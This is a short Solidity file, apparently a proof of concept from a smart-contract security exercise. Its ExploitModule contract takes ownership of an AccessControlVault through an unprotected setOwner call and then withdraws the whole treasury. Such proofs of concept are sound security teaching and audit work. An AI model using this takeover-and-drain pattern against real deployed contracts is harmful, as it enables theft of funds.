// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AccessControlVault} from "../src/AccessControlVault.sol";

contract ExploitModule {
    AccessControlVault public targetContract;

    constructor(address _target) payable {
        targetContract = AccessControlVault(payable(_target));
    }

    function runExploit() external payable {
        // Attacker becomes the owner of the vault
        targetContract.setOwner(address(this));

        // Withdraw the entire treasury balance
        targetContract.withdrawTreasury(payable(address(this)));
    }

    receive() external payable {}
}